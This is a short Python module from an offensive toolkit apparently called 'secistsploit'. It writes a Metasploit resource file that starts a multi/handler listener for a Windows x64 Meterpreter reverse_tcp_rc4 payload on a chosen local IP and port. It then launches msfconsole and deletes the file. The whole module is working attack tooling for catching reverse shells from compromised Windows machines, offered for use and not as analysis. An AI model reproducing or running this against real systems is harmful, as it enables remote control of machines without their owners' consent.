# -*- coding:utf-8 -*-
import struct
import os
from secistsploit.core.exploit import *
from secistsploit.core.tcp.tcp_client import TCPClient


class Exploit(TCPClient):
    __info__ = {
        "name": "listen_reverse_tcp_rc4",
        "description": "listen_reverse_tcp_rc4",
        "authors": (
            "demonsec",
        ),
        "references": (
             "www.ggsec.cn "
             "www.secist.com"
        ),

    }

    lhost = OptIP("", "本地监听IP地址")
    lport = OptPort(4444, "本地监听端口")
    #lhost=(self.port)
    def __init__(self):
        self.endianness = "<"




    def run(self):
        #print_status("secistsploit stopped")
        host=(self.lhost)
        port=(self.lport)
        #configFile.write('printf "\033c"\n')
        configFile = open('reverse_tcp_rc4.rc','w')
        configFile.write('printf "\033c"\n')
        configFile.write('use exploit/multi/handler\n')
        configFile.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp_rc4\n')
        configFile.write('set LPORT ' + str(port) + '\n')
        configFile.write('set LHOST ' + str(host) + '\n')
        configFile.write('exploit -j\n')
        configFile.close()
        os.system('msfconsole -r reverse_tcp_rc4.rc')
        os.remove('reverse_tcp_rc4.rc')
